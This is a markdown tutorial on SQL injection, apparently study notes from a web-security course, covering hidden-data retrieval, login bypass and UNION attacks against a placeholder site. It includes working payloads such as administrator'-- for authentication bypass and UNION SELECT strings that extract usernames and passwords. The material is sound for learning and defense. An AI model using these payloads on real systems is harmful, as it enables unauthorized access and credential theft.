# SQL Injection

- SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.


## SQL injection examples

- Retrieving hidden data
- Subverting application logic
- UNION attacks
- Examining the database in SQL injection attacks
- Blind SQL injection

## 1. Retrieving hidden data
The browser requests the URL:
```
https://insecure-website.com/products?category=Gifts
```

This causes the application to make a SQL query to retrieve details of the relevant products from the database: 
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:
```
https://insecure-website.com/products?category=Gifts'--
```

This results in the SQL query: 
```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

- The key thing here is that the double-dash sequence -- is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment. This effectively removes the remainder of the query, so it no longer includes AND released = 1. This means that all products are displayed, including unreleased products.


## 2. Subverting application logic

Consider an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query: 

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```



## 3. UNION attacks

- The UNION keyword can be used to retrieve data from other tables within the database. This results in a SQL injection UNION attack.

#### The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:
```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

#### For a UNION query to work, two key requirements must be met:
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

#### To carry out a SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:
- How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

#### SQL injection UNION attack, determining the number of columns returned by the query
```
'+UNION+SELECT+NULL,NULL--
```

#### SQL injection UNION attack, finding a column containing text
```
'+UNION+SELECT+'abcdef',NULL,NULL--
```

#### SQL injection UNION attack, retrieving data from other tables
```
'+UNION+SELECT+username,+password+FROM+users--
```

#### SQL injection UNION attack, retrieving multiple values in a single column
```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
